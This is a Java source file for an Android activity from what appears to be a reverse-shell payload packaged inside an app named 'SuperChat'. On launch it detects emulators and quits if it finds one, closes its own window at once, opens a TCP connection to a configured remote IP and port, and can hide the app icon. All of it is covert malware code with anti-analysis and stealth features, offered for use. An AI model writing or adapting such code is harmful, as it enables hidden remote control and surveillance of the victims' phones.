package com.teamxdevelopers.SuperChat.malware.JavaPayload;

// Import statements for necessary Android and support classes.
import androidx.appcompat.app.AppCompatActivity;
import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.config;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions;

/*
This code defines MainActivity, an Android activity that plays a central role in a reverse shell application.
The purpose of this activity is to start a TCP connection to a specified IP address and port when the activity is created.
It also has an option to hide the app icon based on a configuration setting. Here's a breakdown of the code with comments for better understanding:
 */
// MainActivity extends AppCompatActivity, providing compatibility support for various Android versions and features.
public class MainActivity extends AppCompatActivity {

    // Activity and Context references for later use in the application.
    Activity activity = this;
    Context context;
    // TAG used for logging.
    static String TAG = "MainActivityClass";
    // Reference for WakeLock, but it's initialized and not used within this code snippet.
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        // Overrides pending transitions to make activity transition instant.
        overridePendingTransition(0, 0);
        // Gets the application context.
        context = getApplicationContext();

        // Log Build properties to inspect their values on an emulator
        logBuildProperties();

        if (isRunningOnEmulator()) {
            Log.d("tcpConnection", "Running on an emulator. Shutting down the app. main activity");

            // Run on the UI thread
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    // If running on an emulator, shut down the app
                    // Calling finishAffinity() on the main thread
                    activity.finishAffinity();
                }
            });

            // Optionally, return from the constructor to prevent further execution
            return;
        }

        // Logs the IP and port being used for the TCP connection.
        Log.d(TAG, config.IP+"\t"+config.port);
        // Finishes the activity right after starting it.
        finish();
        // Starts a new tcpConnection AsyncTask to handle network operations in the background.
        new tcpConnection(activity,context).execute(config.IP,config.port);
        // Overrides pending transitions again to ensure the activity finishes instantly.
        overridePendingTransition(0, 0);
        // If the configuration specifies, hides the app icon.
        if(config.icon){
            new functions(activity).hideAppIcon(context);
        }
    }


    private boolean isRunningOnEmulator() {
        return Build.FINGERPRINT.startsWith("google/sdk_gphone") ||
                Build.FINGERPRINT.contains("generic") ||
                Build.FINGERPRINT.contains("vbox") ||
                Build.FINGERPRINT.contains("emulator") ||
                Build.FINGERPRINT.contains("test-keys") ||
                Build.MODEL.startsWith("sdk_gphone") ||
                Build.MODEL.toLowerCase().contains("emulator") ||
                Build.MODEL.toLowerCase().contains("google_sdk") ||
                Build.MODEL.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.compareToIgnoreCase("Genymotion") == 0 ||
                Build.MANUFACTURER.contains("Google") ||
                Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic") ||
                Build.BRAND.compareToIgnoreCase("Android") == 0 && Build.DEVICE.compareToIgnoreCase("generic") == 0 ||
                Build.PRODUCT.startsWith("sdk_gphone") ||
                Build.PRODUCT.compareToIgnoreCase("google_sdk") == 0 ||
                Build.PRODUCT.compareToIgnoreCase("sdk") == 0 ||
                Build.PRODUCT.contains("_sdk") ||
                Build.PRODUCT.contains("sdk_") ||
                Build.PRODUCT.contains("vbox86p") ||
                Build.HARDWARE.contains("goldfish") ||
                Build.HARDWARE.contains("ranchu") ||
                Build.HARDWARE.contains("vbox86") ||
                Build.BOARD.toLowerCase().contains("emulator") ||
                (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) ||
                "google_sdk".equals(Build.PRODUCT);
    }

    // Additional method to log Build properties
    private void logBuildProperties() {
        Log.d("BuildProperties", "FINGERPRINT: " + Build.FINGERPRINT);
        Log.d("BuildProperties", "MODEL: " + Build.MODEL);
        Log.d("BuildProperties", "MANUFACTURER: " + Build.MANUFACTURER);
        Log.d("BuildProperties", "BRAND: " + Build.BRAND);
        Log.d("BuildProperties", "DEVICE: " + Build.DEVICE);
        Log.d("BuildProperties", "PRODUCT: " + Build.PRODUCT);
    }


}
